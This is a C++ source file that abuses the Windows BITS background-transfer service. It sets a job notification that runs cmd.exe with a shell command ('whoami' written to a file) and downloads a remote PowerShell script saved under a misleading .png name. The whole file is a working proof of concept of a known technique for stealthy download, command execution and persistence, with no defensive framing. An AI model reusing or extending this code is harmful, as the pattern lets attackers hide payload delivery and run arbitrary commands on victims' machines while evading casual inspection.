#include <Windows.h>
#include <iostream>
#include <atlcomcli.h>
#include <Bits.h>

int Error(const char* message, HRESULT hr) {
    printf("%s\nCOM error (hr=%08X)\n", message, hr);
    return 1;
}

int main() {

    // Initialize COM
    HRESULT hr = ::CoInitialize(nullptr);
    if FAILED(hr)
        return Error("Error CoInitialize", hr);

    // Create instance of Bits COM class
    IBackgroundCopyManager* mgr;
    hr = ::CoCreateInstance(__uuidof(BackgroundCopyManager),
        nullptr,
        CLSCTX_ALL,
        __uuidof(IBackgroundCopyManager),
        reinterpret_cast<void**>(&mgr));
    if (FAILED(hr))
        return Error("Error Creating Instance", hr);

    // Create a Job
    GUID jobId;
    IBackgroundCopyJob* pJob;
    hr = mgr->CreateJob(L"My Job", BG_JOB_TYPE_DOWNLOAD, &jobId, &pJob);
    if FAILED(hr)
        return Error("Error creating Job", hr);

    CComPtr<IBackgroundCopyJob2> spJob2;
    hr = pJob->QueryInterface(__uuidof(IBackgroundCopyJob2), reinterpret_cast<void**>(&spJob2));
    
    if (spJob2) {
        std::cout << "QueryInterface spJob2!" << std::endl;
        hr = spJob2->SetNotifyCmdLine(L"c:\\windows\\system32\\cmd.exe", L"/c \"whoami > C:\\temp\\test1.txt\"");
        if FAILED(hr)
            return Error("Error adding notifier", hr);
    }



    // Release the interface pointer to IBackgroundCopyManager 
    // We now have interface pointer to IBackgroundCopyJob object
    mgr->Release();


    // Add a download
    hr = spJob2->AddFile(
        L"https://gist.githubusercontent.com/vladburch/ad0669e2a5278bbda54c2b7afb5403d1/raw/e322c85e608189cf69ec949ac9f6fa7cfbf5c5f0/get_process.ps1",
        L"C:\\temp\\image.png");
    if FAILED(hr)
        return Error("Error adding a download", hr);

    // Initiate the transfer
    hr = spJob2->Resume();

    if (SUCCEEDED(hr)) {
        printf("Downloading...");
        BG_JOB_STATE state;
        for (;;) {
            spJob2->GetState(&state);  // assu,e it cannot fail
            if (state == BG_JOB_STATE_ERROR || state == BG_JOB_STATE_TRANSFERRED)
                break;
            printf(".");
            ::Sleep(300);
        }
        // Display results
        if (state == BG_JOB_STATE_ERROR)
            printf("\nError in transfer\n");
        else {
            spJob2->Complete();
            printf("Transfer successful!");
        }
    }

    pJob->Release();
    spJob2.Release();

    ::CoUninitialize();

    return 0;
}
